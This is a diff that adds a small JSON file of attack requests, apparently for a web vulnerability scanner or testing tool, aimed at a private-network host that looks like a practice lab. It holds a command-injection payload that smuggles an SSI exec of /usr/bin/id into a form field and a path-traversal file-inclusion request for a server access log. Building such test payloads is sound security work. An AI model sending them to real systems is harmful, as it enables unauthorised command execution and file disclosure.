@@ -1,0 +1,18 @@
+{
+    "CI": [
+        {
+            "method": "POST",
+            "url": "http://192.168.112.130/vulnerabilities/exec/",
+            "data": {
+                "ip": "&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;",
+                "submit": "submit"
+            }
+        }
+    ],
+    "LFI": [
+        {
+            "method": "GET",
+            "url": "http://192.168.112.130/vulnerabilities/fi/?page=..//usr/local/cpanel/logs/access_log"
+        }
+    ]
+}
